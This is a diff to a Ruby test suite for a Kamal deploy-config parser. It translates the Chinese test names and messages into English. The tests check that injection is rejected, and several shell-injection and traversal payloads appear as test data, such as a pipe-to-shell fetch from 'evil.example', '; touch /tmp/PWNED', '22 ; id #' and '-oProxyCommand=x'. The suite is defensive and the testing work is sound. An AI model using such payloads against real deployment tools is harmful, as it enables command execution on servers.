@@ -29,7 +29,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     file_fixture("simple_deploy.yml").read
   end
 
-  test "解析出服务名、角色与主机" do
+  test "parses the service name, roles and hosts" do
     parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")
 
     assert_equal "blog", parsed.service
@@ -39,21 +39,21 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     assert_equal "registry.example.com", parsed.registry_server
   end
 
-  test "容器名前缀含 destination，与 Kamal 的约定一致" do
+  test "container name prefix includes the destination, matching Kamal's convention" do
     parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")
     web = parsed.roles.detect { |r| r[:name] == "web" }
 
     assert_equal "blog-web-production", web[:container_prefix]
   end
 
-  test "沿用 deploy.yml 里声明的 SSH 参数" do
+  test "reuses the SSH options declared in deploy.yml" do
     parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")
 
     assert_equal "deploy", parsed.ssh_options[:user]
     assert_equal 2201, parsed.ssh_options[:port]
   end
 
-  test "无效 YAML 抛 ParseError 而非崩溃" do
+  test "invalid YAML raises ParseError instead of crashing" do
     error = assert_raises(Kamal::ConfigParser::ParseError) do
       Kamal::ConfigParser.call(yaml: "这不是合法的 deploy 配置")
     end
@@ -61,7 +61,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     assert_match(/./, error.message)
   end
 
-  test "解析在子进程中进行：deploy.yml 中的 ERB 无法污染面板进程" do
+  test "parsing runs in a subprocess: ERB in deploy.yml cannot pollute the panel process" do
     malicious = <<~YAML
       service: evil
       image: example/evil
@@ -80,10 +80,10 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     end
 
     refute defined?(::PANEL_WAS_COMPROMISED),
-      "ERB 在面板进程内被求值了——解析没有真正隔离到子进程"
+      "ERB was evaluated inside the panel process -- parsing is not truly isolated in the subprocess"
   end
 
-  test "解析超时被当作失败处理" do
+  test "a parse timeout is treated as a failure" do
     slow = <<~YAML
       service: slow
       image: example/slow
@@ -98,7 +98,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     end
   end
 
-  test "解析超时不会在磁盘上留下临时文件（含用户 payload）" do
+  test "a parse timeout leaves no temp files on disk (including the user payload)" do
     slow = <<~YAML
       service: slow
       image: example/slow
@@ -115,7 +115,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     end
 
     assert_empty Dir.glob(pattern),
-      "超时后临时目录未被清理——用户粘贴的 deploy.yml 可能仍留在磁盘上"
+      "the temp directory was not cleaned up after the timeout -- the user's pasted deploy.yml may still be on disk"
   end
 
   # destination currently has no length limit, and inflating it inflates the JSON payload
@@ -130,7 +130,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     "x" * (256 * 1024)
   end
 
-  test "父进程写 stdin 也受硬超时保护：子进程从不读 stdin 时，父进程不会被写操作卡住" do
+  test "the parent's stdin write is under the hard timeout too: a child that never reads stdin cannot block it" do
     parser = NeverReadsStdin.new(yaml: simple_yaml, destination: huge_destination, destination_yaml: nil, timeout: 0.5)
 
     t0 = Process.clock_gettime(Process::CLOCK_MONOTONIC)
@@ -141,10 +141,10 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
 
     # Before this fix, what was measured here was 117.85 seconds (the parent really got stuck on
     # stdin.write and the hard timeout never took effect). Now it should land near the timeout.
-    assert_operator elapsed, :<, 5.0, "stdin.write 应该跟别的 IO 一样受硬超时保护，不应该让父进程卡住"
+    assert_operator elapsed, :<, 5.0, "stdin.write should be covered by the hard timeout like other IO and must not block the parent"
   end
 
-  test "子进程提前退出（完全不读 stdin）时，父进程写 stdin 不会抛出未处理的 Errno::EPIPE" do
+  test "a child exiting early without reading stdin does not make the parent's write raise Errno::EPIPE" do
     parser = ExitsImmediately.new(yaml: simple_yaml, destination: huge_destination, destination_yaml: nil, timeout: 3.0)
 
     # The expected failure mode is ParseError ("subprocess produced no output") -- not
@@ -156,7 +156,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     end
   end
 
-  test "子进程输出超过管道缓冲区也不会被误报为超时" do
+  test "child output exceeding the pipe buffer is not misreported as a timeout" do
     many_hosts = (1..5_000).map { |i| "10.#{(i >> 16) & 0xFF}.#{(i >> 8) & 0xFF}.#{i & 0xFF}" }
     large_yaml = YAML.dump(
       "service" => "big",
@@ -176,7 +176,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     assert_equal many_hosts.sort, parsed.app_hosts.sort
   end
 
-  test "destination_yaml 覆盖 base 里的 servers（destination 的主要用途）" do
+  test "destination_yaml overrides servers in the base (the main purpose of a destination)" do
     base = YAML.dump(
       "service" => "blog",
       "image" => "example/blog",
@@ -195,7 +195,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     assert_equal [ "10.0.0.9" ], parsed.app_hosts
   end
 
-  test "destination_yaml 为 nil 时按空占位符解析，不报错" do
+  test "parses with an empty placeholder when destination_yaml is nil, without error" do
     parsed = Kamal::ConfigParser.call(
       yaml: simple_yaml,
       destination: "production",
@@ -206,14 +206,14 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     assert_equal "production", parsed.destination
   end
 
-  test "不传 destination 时不需要伴随文件，照常解析" do
+  test "no companion file is needed without a destination; parses as usual" do
     parsed = Kamal::ConfigParser.call(yaml: simple_yaml)
 
     assert_nil parsed.destination
     assert_equal "blog", parsed.service
   end
 
-  test "空字符串的 destination 跟不传一样，不需要伴随文件" do
+  test "an empty-string destination behaves like none and needs no companion file" do
     parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "")
 
     assert_nil parsed.destination
@@ -227,7 +227,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
   # destination_config_yaml to an arbitrary location outside the temp directory, and the subprocess
   # could be induced to read (and ERB-evaluate) any existing .yml on the host. -------
 
-  test "destination 里的路径穿越序列被拒绝（字符集校验），且不会在临时目录之外创建任何文件" do
+  test "path traversal sequences in destination are rejected (charset check) and nothing is created outside the temp dir" do
     # The target must be derived from this very same traversal payload, not written
     # separately: before, the target assumed here was Rails.root/tmp/..., but the payload
     # actually resolves to /tmp/... -- they are different files, so even if the
@@ -256,7 +256,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
 
     assert_match(/destination 不合法/, error.message)
     refute target.exist?,
-      "destination 里的路径穿越序列本该被拒绝，却真的在临时目录之外创建了文件（#{target}）"
+      "path traversal sequences in destination should have been rejected, but a file was actually created outside the temp directory (#{target})"
   ensure
     FileUtils.rm_f(target)
   end
@@ -269,7 +269,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
   # this is exactly what "defense in depth" has to prove -- even if the first gate
   # (charset) is later broken or bypassed, the second gate (the path must land inside the
   # temp directory) still works independently.
-  test "即使绕过字符集校验，destination_path 也会拒绝任何解析到临时目录之外的路径" do
+  test "even with the charset check bypassed, destination_path rejects any path resolving outside the temp dir" do
     parser = Kamal::ConfigParser.new(yaml: simple_yaml, destination: "x", destination_yaml: nil, timeout: 5)
     parser.instance_variable_set(:@destination, "../../../../../../tmp/PWNED_via_destination_path")
 
@@ -292,7 +292,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
   # flow never gets this far, so there is nothing to leak or test), but separately
   # confirming the behavior of the second gate itself: rejection happens before reading,
   # independent of whether the file exists or its contents are valid.
-  test "绕开字符集校验后，destination_path 会在读取内容之前就拒绝一份放在临时目录之外、真实存在的 .yml" do
+  test "with the charset check bypassed, destination_path rejects an existing .yml outside the temp dir before reading it" do
     outside = Rails.root.join("tmp", "outside_kamal_panel_test.yml")
     outside.write(YAML.dump("servers" => { "web" => [ "6.6.6.6" ] }))
 
@@ -309,7 +309,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     FileUtils.rm_f(outside)
   end
 
-  test "destination 超过长度上限时被校验拒绝，而不是撞上文件系统的文件名长度限制" do
+  test "a destination over the length limit is rejected by validation, not by the filesystem filename limit" do
     error = assert_raises(Kamal::ConfigParser::ParseError) do
       Kamal::ConfigParser.call(yaml: simple_yaml, destination: "x" * 64)
     end
@@ -318,15 +318,15 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     refute_match(/ENAMETOOLONG|File name too long/, error.message)
   end
 
-  test "正常的短 destination（含连字符和数字）不受影响" do
+  test "normal short destinations (hyphens and digits) are unaffected" do
     %w[production staging eu-west prod2].each do |dest|
       parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: dest)
 
-      assert_equal dest, parsed.destination, "destination=#{dest.inspect} 应该照常解析"
+      assert_equal dest, parsed.destination, "destination=#{dest.inspect} should parse as usual"
     end
   end
 
-  test "非 String 的 destination（绕过 ManagedApp 的直接调用者可能传错类型）被拒绝为 ParseError，而不是 NoMethodError" do
+  test "a non-String destination (from a direct caller bypassing ManagedApp) is rejected as ParseError, not NoMethodError" do
     error = assert_raises(Kamal::ConfigParser::ParseError) do
       Kamal::ConfigParser.call(yaml: simple_yaml, destination: 42)
     end
@@ -374,19 +374,19 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     YAML
   end
 
-  test "service 含路径分隔符时被拒绝" do
+  test "a service containing a path separator is rejected" do
     assert_raises(Kamal::ConfigParser::ParseError) do
       Kamal::ConfigParser.call(yaml: yaml_with_service("a/b"))
     end
   end
 
-  test "service 含路径穿越序列时被拒绝" do
+  test "a service containing a path traversal sequence is rejected" do
     assert_raises(Kamal::ConfigParser::ParseError) do
       Kamal::ConfigParser.call(yaml: yaml_with_service("../../etc/passwd"))
     end
   end
 
-  test "Kamal 自己的校验能被换行符绕过，但本类的 validate_service! 挡住了它" do
+  test "Kamal's own validation can be bypassed with a newline, but this class's validate_service! blocks it" do
     # "\n" inside a double-quoted YAML scalar is a real newline (not a literal backslash n).
     # Kamal's /^[a-z0-9_-]+$/i only requires one whole line to match -- the first line "ok"
     # alone satisfies it -- so Kamal's own check lets the whole string through, carrying
@@ -396,15 +396,15 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     end
 
     assert_match(/service 不合法/, error.message,
-      "本类自己的校验（字符串锚点 \\A...\\z）应该拒绝这个换行注入，" \
-      "而不是让 Kamal 自己那条较弱的校验（行锚点 ^...$）把它放行")
+      "this class's own validation (string anchors \\A...\\z) should reject this newline injection, " \
+      "rather than letting Kamal's weaker validation (line anchors ^...$) let it through")
   end
 
-  test "正常的 service 名称不受影响" do
+  test "normal service names are unaffected" do
     %w[blog my-app web2 some_service].each do |name|
       parsed = Kamal::ConfigParser.call(yaml: yaml_with_service(name))
 
-      assert_equal name, parsed.service, "service=#{name.inspect} 应该照常解析"
+      assert_equal name, parsed.service, "service=#{name.inspect} should parse as usual"
     end
   end
 
@@ -433,7 +433,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     )
   end
 
-  test "ssh.proxy 合法（user@host）时被构造成可用的 Net::SSH::Proxy::Jump" do
+  test "a valid ssh.proxy (user@host) is built into a usable Net::SSH::Proxy::Jump" do
     parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "user@bastion"), destination: "production")
 
     proxy = parsed.ssh_options[:proxy]
@@ -442,25 +442,25 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     assert_equal "user@bastion", proxy.jump_proxies
   end
 
-  test "ssh.proxy 合法（user@host:port）时端口原样保留在 jump spec 里" do
+  test "a valid ssh.proxy (user@host:port) keeps the port as-is in the jump spec" do
     parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "user@bastion:2222"), destination: "production")
 
     assert_equal "user@bastion:2222", parsed.ssh_options[:proxy].jump_proxies
   end
 
-  test "ssh.proxy 裸主机名时默认 user 为 root，与 Kamal::Configuration::Ssh#proxy 的规则一致" do
+  test "a bare-hostname ssh.proxy defaults the user to root, matching Kamal::Configuration::Ssh#proxy" do
     parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "bastion"), destination: "production")
 
     assert_equal "root@bastion", parsed.ssh_options[:proxy].jump_proxies
   end
 
-  test "没有配置 ssh.proxy 时 ssh_options[:proxy] 是 nil，不会凭空造出一个代理对象" do
+  test "ssh_options[:proxy] is nil without ssh.proxy and no proxy object is conjured up" do
     parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")
 
     assert_nil parsed.ssh_options[:proxy]
   end
 
-  test "ssh.proxy 带逗号（Net::SSH::Proxy::Jump 的多跳/命令注入点）被拒绝" do
+  test "an ssh.proxy containing a comma (multi-hop/command injection point in Net::SSH::Proxy::Jump) is rejected" do
     error = assert_raises(Kamal::ConfigParser::ParseError) do
       Kamal::ConfigParser.call(
         yaml: yaml_with_ssh("proxy" => "user@bastion,x; curl evil.example/s | sh"),
@@ -471,7 +471,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     assert_match(/逗号/, error.message)
   end
 
-  test "ssh.proxy 里带 shell 特殊字符（分号、管道、命令替换、反引号、空白）逐一被拒绝" do
+  test "ssh.proxy with shell special characters (semicolon, pipe, substitution, backtick, whitespace) is rejected" do
     [
       "user@bastion; curl evil.example/s | sh",
       "user@bastion|sh",
@@ -480,11 +480,11 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
       "user@bastion extra",
       "user name@bastion"
     ].each do |bad_proxy|
-      error = assert_raises(Kamal::ConfigParser::ParseError, "应该拒绝 #{bad_proxy.inspect}") do
+      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{bad_proxy.inspect}") do
         Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => bad_proxy), destination: "production")
       end
 
-      assert_match(/ssh\.proxy 不合法/, error.message, "拒绝 #{bad_proxy.inspect} 时应该给出 ssh.proxy 格式错误，而不是别的报错")
+      assert_match(/ssh\.proxy 不合法/, error.message, "rejecting #{bad_proxy.inspect} should give an ssh.proxy format error, not some other error")
     end
   end
 
@@ -492,13 +492,13 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
   # but Kamal's own proxy rule (Kamal::Configuration::Ssh#proxy) has no such restriction --
   # hostnames like "bastion_1" used to work and stopped working after round 4, which is
   # a regression that should not exist.
-  test "ssh.proxy 主机名带下划线（如 'bastion_1'）不再被拒绝——round 4 曾经误拒了这个" do
+  test "an ssh.proxy hostname with an underscore (e.g. 'bastion_1') is no longer rejected -- round 4 wrongly did" do
     parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "user_1@bastion_2:2222"), destination: "production")
 
     assert_equal "user_1@bastion_2:2222", parsed.ssh_options[:proxy].jump_proxies
   end
 
-  test "ssh.proxy 的 user 部分带前导连字符时被拒绝（参数注入，跟 host 用同一条规则）" do
+  test "an ssh.proxy user part with a leading hyphen is rejected (argument injection, same rule as host)" do
     error = assert_raises(Kamal::ConfigParser::ParseError) do
       Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "-F@bastion"), destination: "production")
     end
@@ -513,7 +513,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
   # metacharacters. Here we only call build_proxy_command_equivalent (not #open), so no
   # subprocess is actually run and no connection is made; it purely checks "what command
   # line this class would assemble from validated input".
-  test "重新过一遍 ssh.proxy 的字符集（含 round 5 放开的下划线），构造出的真实命令行不含 shell 元字符" do
+  test "re-checks the ssh.proxy charset (incl. the underscore allowed in round 5): the built command line has no shell metacharacters" do
     accepted_proxies = [
       "user@bastion",
       "bastion",
@@ -532,16 +532,16 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
       parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => proxy_spec), destination: "production")
       proxy = parsed.ssh_options[:proxy]
 
-      assert_instance_of Net::SSH::Proxy::Jump, proxy, "#{proxy_spec.inspect} 应该被接受"
+      assert_instance_of Net::SSH::Proxy::Jump, proxy, "#{proxy_spec.inspect} should be accepted"
 
       command_line = proxy.build_proxy_command_equivalent(nil)
 
       refute_match(shell_metacharacters, command_line,
-        "#{proxy_spec.inspect} 构造出的命令行不应该包含 shell 元字符，实际是 #{command_line.inspect}")
+        "the command line built from #{proxy_spec.inspect} should not contain shell metacharacters, got #{command_line.inspect}")
     end
   end
 
-  test "ssh.proxy_command 被拒绝，并给出专门指向 ssh.proxy 的中文报错——这是永久的产品决定，不是 v1 限制" do
+  test "ssh.proxy_command is rejected with a Chinese error pointing to ssh.proxy -- a permanent product decision, not a v1 limit" do
     error = assert_raises(Kamal::ConfigParser::ParseError) do
       Kamal::ConfigParser.call(
         yaml: yaml_with_ssh("proxy_command" => "ssh -W %h:%p bastion"),
@@ -550,7 +550,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     end
 
     assert_match(/proxy_command 不受支持/, error.message)
-    assert_match(/ssh\.proxy/, error.message, "报错应该告诉用户改用 ssh.proxy")
+    assert_match(/ssh\.proxy/, error.message, "the error should tell the user to use ssh.proxy instead")
   end
 
   # --- servers: hostname/IP, ssh.port attack surface --------------------------------
@@ -578,7 +578,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     )
   end
 
-  test "review 验证过可行的 payload：servers 主机名里带 '; touch ... #' 被拒绝" do
+  test "payload verified feasible in review: a servers hostname containing '; touch ... #' is rejected" do
     error = assert_raises(Kamal::ConfigParser::ParseError) do
       Kamal::ConfigParser.call(yaml: yaml_with_servers([ "1.2.3.4 ; touch /tmp/PWNED_by_config_parser_test #" ]), destination: "production")
     end
@@ -586,7 +586,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     assert_match(/servers 里的主机名\/IP 不合法/, error.message)
   end
 
-  test "review 验证过可行的 payload：ssh.port 是 '22 ; id #' 被拒绝" do
+  test "payload verified feasible in review: ssh.port '22 ; id #' is rejected" do
     error = assert_raises(Kamal::ConfigParser::ParseError) do
       Kamal::ConfigParser.call(yaml: yaml_with_ssh("port" => "22 ; id #"), destination: "production")
     end
@@ -597,7 +597,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
   # round 5 review: IPv6 moved from "should reject" to "should accept" (see the IPv6 test
   # added below), so "::1" was removed from this batch test -- not a gap in coverage, it
   # should be accepted anyway, and leaving it would only fight the new behavior.
-  test "servers 主机名/IP 里带 shell 特殊字符、控制字符、多个 @、非 ASCII 逐一被拒绝" do
+  test "servers hostname/IP with shell special characters, control characters, multiple @, or non-ASCII is rejected" do
     [
       "1.2.3.4; touch /tmp/PWNED",
       "host|sh",
@@ -613,11 +613,11 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
       "主机名.example.com",  # non-ASCII
       "-oProxyCommand=x"    # leading hyphen: see the comment above HOST_FORMAT, argument injection
     ].each do |bad_host|
-      error = assert_raises(Kamal::ConfigParser::ParseError, "应该拒绝 #{bad_host.inspect}") do
+      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{bad_host.inspect}") do
         Kamal::ConfigParser.call(yaml: yaml_with_servers([ bad_host ]), destination: "production")
       end
 
-      assert_match(/servers 里的主机名\/IP 不合法/, error.message, "拒绝 #{bad_host.inspect} 时应该给出 host 格式错误，而不是别的报错")
+      assert_match(/servers 里的主机名\/IP 不合法/, error.message, "rejecting #{bad_host.inspect} should give a host format error, not some other error")
     end
   end
 
@@ -626,17 +626,17 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
   # regression test here that locks this point specifically, written separately from the
   # "normal hostnames" one so it's obvious at a glance that this tests the problem fixed
   # this round, rather than being covered incidentally.
-  test "servers 主机名带下划线（如 'bastion_1'）不再被拒绝——round 4 曾经误拒了这个" do
+  test "a servers hostname with an underscore (e.g. 'bastion_1') is no longer rejected -- round 4 wrongly did" do
     parsed = Kamal::ConfigParser.call(yaml: yaml_with_servers([ "bastion_1" ]), destination: "production")
 
     assert_equal [ "bastion_1" ], parsed.app_hosts
   end
 
-  test "正常的 servers 主机名/IP（IPv4、主机名、带连字符和点的主机名）不受影响" do
+  test "normal servers hostnames/IPs (IPv4, hostnames, hostnames with hyphens and dots) are unaffected" do
     [ "127.0.0.1", "web1", "web-01.prod-eu.example.com" ].each do |good_host|
       parsed = Kamal::ConfigParser.call(yaml: yaml_with_servers([ good_host ]), destination: "production")
 
-      assert_equal [ good_host ], parsed.app_hosts, "#{good_host.inspect} 应该照常解析"
+      assert_equal [ good_host ], parsed.app_hosts, "#{good_host.inspect} should parse as usual"
     end
   end
 
@@ -645,7 +645,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
   # (letters, digits, dots, hyphens only) would misjudge all of them as "invalid format" --
   # for a pure IPv6 deployment that means it simply can't be onboarded, and the error
   # blames the charset, telling the user their perfectly valid deploy.yml is wrong.
-  test "servers 主机名支持裸 IPv6" do
+  test "servers hostnames support bare IPv6" do
     [
       "::1",
       "2001:db8::1",
@@ -653,7 +653,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     ].each do |ipv6_host|
       parsed = Kamal::ConfigParser.call(yaml: yaml_with_servers([ ipv6_host ]), destination: "production")
 
-      assert_equal [ ipv6_host ], parsed.app_hosts, "#{ipv6_host.inspect} 应该被接受"
+      assert_equal [ ipv6_host ], parsed.app_hosts, "#{ipv6_host.inspect} should be accepted"
     end
   end
 
@@ -663,19 +663,19 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
   # and neither recognizes the "[::1]" form, so validation passes yet the connection fails
   # bizarrely. Here bracketed IPv6 is pulled back to "not yet supported", reusing the
   # honest host:port / user@host:port error rather than inventing a second wording.
-  test "servers 主机名：方括号 IPv6（带/不带端口）被拒绝，报错说的是暂不支持" do
+  test "servers hostname: bracketed IPv6 (with/without port) is rejected with a not-yet-supported error" do
     [ "[::1]", "[2001:db8::1]", "[::1]:2222", "[2001:db8::1]:2222" ].each do |bracketed_host|
-      error = assert_raises(Kamal::ConfigParser::ParseError, "应该拒绝 #{bracketed_host.inspect}") do
+      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{bracketed_host.inspect}") do
         Kamal::ConfigParser.call(yaml: yaml_with_servers([ bracketed_host ]), destination: "production")
       end
 
-      assert_match(/暂不支持/, error.message, "#{bracketed_host.inspect} 应该得到「暂不支持」的报错")
+      assert_match(/暂不支持/, error.message, "#{bracketed_host.inspect} should get the \"not supported yet\" error")
       assert_match(/servers 里的 #{Regexp.escape(bracketed_host.inspect)}/, error.message)
       refute_match(/格式不合法|字符集/, error.message)
     end
   end
 
-  test "servers 主机名：IPv6 zone id（'%eth0' 这类）依然被拒绝——即使裸 IPv6 已经放开" do
+  test "servers hostname: an IPv6 zone id (like '%eth0') is still rejected even though bare IPv6 is allowed" do
     # fe80::1%eth0 is a valid RFC 4007 scoped address that Resolv::IPv6::Regex itself
     # accepts, but "%" happens to be the substitution character of the Net::SSH::Proxy::Jump
     # command-line template itself (%h/%p), so it must be explicitly blocked outside the
@@ -688,9 +688,9 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
     assert_match(/servers 里的主机名\/IP 不合法/, error.message)
   end
 
-  test "servers 主机名：方括号 IPv6 端口不合法（超出范围/非数字）时被拒绝" do
+  test "servers hostname: a bracketed IPv6 with an invalid port (out of range/non-numeric) is rejected" do
     [ "[::1]:0", "[::1]:65536", "[::1]:abc" ].each do |bad_host|
-      error = assert_raises(Kamal::ConfigParser::ParseError, "应该拒绝 #{bad_host.inspect}") do
+      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{bad_host.inspect}") do
         Kamal::ConfigParser.call(yaml: yaml_with_servers([ bad_host ]), destination: "production")
       end
 
@@ -704,23 +704,23 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
   # limitation with a "bad charset" error that sounds like "you misconfigured something".
   # What's asserted here is the error message itself (not just any ParseError passing),
   # because what this round truly locks in is whether "the message tells the truth".
-  test "servers 里的 user@host / host:port / user@host:port 被拒绝，但报错说的是暂不支持，不是格式不合法" do
+  test "user@host / host:port / user@host:port in servers are rejected as not supported, not as invalid format" do
     [
       "deploy@web1",
       "web1:2222",
       "deploy@web1:2222"
     ].each do |unsupported_host|
-      error = assert_raises(Kamal::ConfigParser::ParseError, "应该拒绝 #{unsupported_host.inspect}") do
+      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{unsupported_host.inspect}") do
         Kamal::ConfigParser.call(yaml: yaml_with_servers([ unsupported_host ]), destination: "production")
       end
 
-      assert_match(/暂不支持/, error.message, "#{unsupported_host.inspect} 应该得到「暂不支持」的报错，而不是格式不合法")
+      assert_match(/暂不支持/, error.message, "#{unsupported_host.inspect} should get the \"not supported yet\" error, not an invalid-format error")
       assert_match(/servers 里的 #{Regexp.escape(unsupported_host.inspect)}/, error.message)
-      refute_match(/格式不合法|字符集/, error.message, "不应该把一个受支持的 SSHKit 语法说成格式错误")
+      refute_match(/格式不合法|字符集/, error.message, "a supported SSHKit syntax should not be reported as a format error")
     end
   end
 
-  test "ssh.port 里带 shell 特殊字符、非数字、超出范围逐一被拒绝" do
+  test "ssh.port with shell special characters, non-digits, or out-of-range values is rejected" do
     [
       "22; id",
       "22|id",
@@ -733,15 +733,15 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
       "abc",
       "22\n"
     ].each do |bad_port|
-      error = assert_raises(Kamal::ConfigParser::ParseError, "应该拒绝 #{bad_port.inspect}") do
+      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{bad_port.inspect}") do
         Kamal::ConfigParser.call(yaml: yaml_with_ssh("port" => bad_port), destination: "production")
       end
 
-      assert_match(/ssh\.port 不合法/, error.message, "拒绝 #{bad_port.inspect} 时应该给出 ssh.port 格式错误，而不是别的报错")
+      assert_match(/ssh\.port 不合法/, error.message, "rejecting #{bad_port.inspect} should give an ssh.port format error, not some other error")
     end
   end
 
-  test "正常的 ssh.port（Integer 或纯数字字符串）不受影响" do
+  test "a normal ssh.port (Integer or digit-only string) is unaffected" do
     parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("port" => 2222), destination: "production")
     assert_equal 2222, parsed.ssh_options[:port]
 
@@ -753,7 +753,7 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
   # [deliberately] uses a name other than KAMAL_REGISTRY_PASSWORD -- an implementation that
   # hardcodes that constant turns red right here, while testing with the default name
   # would detect nothing.
-  test "解析出 registry 密码引用的环境变量名" do
+  test "parses the environment variable name referenced by the registry password" do
     parsed = Kamal::ConfigParser.call(yaml: file_fixture("registry_env_deploy.yml").read)
 
     assert_equal "MY_OWN_REGISTRY_TOKEN", parsed.registry_password_env
@@ -761,17 +761,17 @@ class Kamal::ConfigParserTest < ActiveSupport::TestCase
 
   # deploy.yml already contains a plaintext password: the panel has no place to inject one, and
   # shouldn't pretend it has.
-  test "密码写成字面量时没有可注入的变量名" do
+  test "a literal password yields no injectable variable name" do
     parsed = Kamal::ConfigParser.call(yaml: file_fixture("registry_literal_deploy.yml").read)
 
     assert_nil parsed.registry_password_env
   end
 
-  test "既有 fixture 的 registry 密码是数组形式，解析出对应的变量名" do
+  test "the existing fixture's registry password is in array form; parses the corresponding variable name" do
     parsed = Kamal::ConfigParser.call(yaml: file_fixture("simple_deploy.yml").read)
 
     assert_equal "registry.example.com", parsed.registry_server,
-      "这个 fixture 本来就有 registry 段，用它来确认解析没坏"
+      "this fixture already has a registry section; use it to confirm parsing is not broken"
     assert_equal "KAMAL_REGISTRY_PASSWORD", parsed.registry_password_env
   end
 end
